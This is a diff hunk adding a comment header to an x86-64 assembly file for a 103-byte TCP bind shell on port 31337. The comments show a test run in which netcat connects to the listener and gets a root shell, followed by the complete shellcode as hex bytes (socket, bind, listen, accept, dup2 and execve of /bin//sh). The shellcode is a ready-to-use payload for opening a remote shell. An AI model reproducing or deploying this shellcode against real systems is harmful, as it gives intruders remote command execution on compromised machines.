@@ -1,3 +1,24 @@
+; 103 Bytes long shellcode
+; TCP Bind shell on port 31337
+
+; 	$ sudo ./test_shellcode "$(cat bind_shell)"
+;	Trying 103 bytes long shellcode ..
+
+;	$ nc -vvv 127.0.0.1 31337
+;	Connection to 127.0.0.1 31337 port [tcp/*] succeeded!
+;	whoami
+;	root
+;	pwd
+;	/home/root/Workspace
+
+;  6a 29 58 6a 02 5f 6a 01  5e 99 0f 05 48 89 c7 6a
+;  31 58 48 31 d2 52 66 c7  44 24 02 7a 69 c6 04 24
+;  02 54 5e b2 10 0f 05 6a  32 58 40 b6 04 0f 05 b0
+;  2b 48 31 f6 48 31 d2 0f  05 48 89 c7 48 31 c0 6a
+;  03 5e 48 ff ce b0 21 0f  05 75 f7 6a 3b 58 48 31
+;  f6 48 31 d2 48 bf 2f 2f  62 69 6e 2f 73 68 48 c1
+;  ef 08 57 54 5f 0f 05
+
 BITS 64
 
 global _start
